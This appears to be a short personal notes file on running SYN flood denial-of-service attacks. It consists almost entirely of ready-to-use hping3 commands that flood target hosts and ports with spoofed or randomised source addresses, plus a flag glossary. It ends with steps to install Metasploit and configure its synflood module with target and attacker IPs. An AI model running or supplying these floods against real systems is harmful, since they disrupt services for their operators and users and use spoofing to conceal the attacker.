# notes


Similarly if u wanna flood the IP x.x.x.x on port 80 with SYN requests from fake IP y.y.y.y, type

 hping3 -S -a y.y.y.y --flood -p 80 x.x.x.x

 hping3 -S --flood -V -p TARGET_PORT TARGET_SITE
 
 Advanced SYN flood with random source IP, different data size, and window size:

hping3 -c 20000 -d 120 -S -w 64 -p TARGET_PORT --flood --rand-source TARGET_SITE
    HPING TARGET_SITE (eth0 xxx.xxx.xxx.xxx): S set, 40 headers + 120 data bytes
    hping in flood mode, no replies will be shown

–flood: sent packets as fast as possible
–rand-source: random source address
-c –count: packet count
-d –data: data size
-S –syn: set SYN flag
-w –win: winsize (default 64)
-p –destport: destination port (default 0)

####

hping3 -c 15000 -d 120 -S -w 64 -p 80 --flood --rand-source 192.168.1.159
 
hping3 -c 10000 -d 120 -S -w 64 -p 21 --flood --rand-source www.hping3testsite.com
 
 ping : 
 hping3 -S -c 20 -i u500000 -p 80 192.168.1.44
 
 hping3 -c 10000 -d 120 -S -w 64 -p 21 --flood --rand-source www.hping3testsite.com
 
 ??  hping3 -S -P -U --flood -V --rand-source www.hping3testsite.com ??
 
##
https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \
  chmod 755 msfinstall && \
  ./msfinstall
  // dont forget to set rport
msfconsole 
use auxiliary/dos/tcp/synflood
msf auxiliary(synflood) > set rhost 192.168.1.107 (target IP)
msf auxiliary(synflood) > set shost 192.168.1.105 (attacker’s IP )
msf auxiliary(synflood) > exploit
